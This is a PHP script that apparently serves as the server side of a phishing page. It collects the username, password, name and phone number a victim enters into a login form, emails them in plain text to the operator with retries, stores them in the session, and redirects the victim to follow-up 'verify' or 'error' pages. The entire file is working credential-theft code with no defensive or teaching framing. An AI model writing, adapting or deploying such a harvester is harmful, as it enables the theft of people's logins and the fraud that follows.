<?php

use Exception;

include_once './config.php';

$username               =   $_POST['username'];
$password               =   $_POST['password'];
$name                   =   empty($_POST['name']) ? null : $_POST['name'];
$phone_number           =   empty($_POST['phone_number']) ? null : $_POST['phone_number'];
$phone_code             =   empty($_POST['phone_number_phoneCode']) ? null : $_POST['phone_number_phoneCode'];
$country_code           =   empty($_POST['phone_number_countryCode']) ? null : $_POST['phone_number_countryCode'];

if (empty($username) || empty($password)) {
    redirect(base_url());
} else {
    
    function sendEmail($try=1) {
        global $username;
        global $password;
        global $name;
        global $phone_number;
        global $phone_code;
        global $country_code;
        
        try {
            $mail           =   get_mail_smtp();
            
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject  = 'New Login Query Received';

            $html           =   '<p>A New Login Detected,</p>' ;
            $html          .=   '<p>You have received a new query from <b>' . base_url() . '</b>,</p>' ;
            $html          .=   '<p><b>Additional detail</b></p>' ;
            $html          .=   '<ul>' ;
            $html          .=   "<li>Email/UserName : <b>".$username."</b></li>";
            $html          .=   "<li>Password : <b>".$password."</b></li>";
            if(!empty($phone_number)) {
                $html       .=   "<li>Phone Code : <b>".$phone_code."</b> (<b>".$country_code."</b>)</li>";
                $html       .=   "<li>Phone Number : <b>".$phone_number."</b></li>";
                $html       .=   "<li>Full Name : <b>".$name."</b></li>";
            }
            $html          .=   '</ul>' ;
            $mail->Body     =   $html;
            $mail->AltBody  =   'Email : '.$username.' and Password :'. $password;

            $mail->send();

            $_SESSION["username"]       =   $username;
            $_SESSION["password"]       =   $password;
            $_SESSION["phone_number"]   =   $phone_number;
            $_SESSION["phone_code"]     =   $phone_code;
            $_SESSION["country_code"]   =   $country_code;
            
            if(empty($phone_number)) {
                redirect(base_url('verify.php'));
            } else {
                redirect(base_url('error.php'));
            }
        } catch (Exception $exc) {
            $try = $try +1;
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            if($try < 5) {
                sleep(2);
                sendEmail($try);
            } else {
                redirect(base_url());
            }
        }
    }
    
    sendEmail(1);
}
?>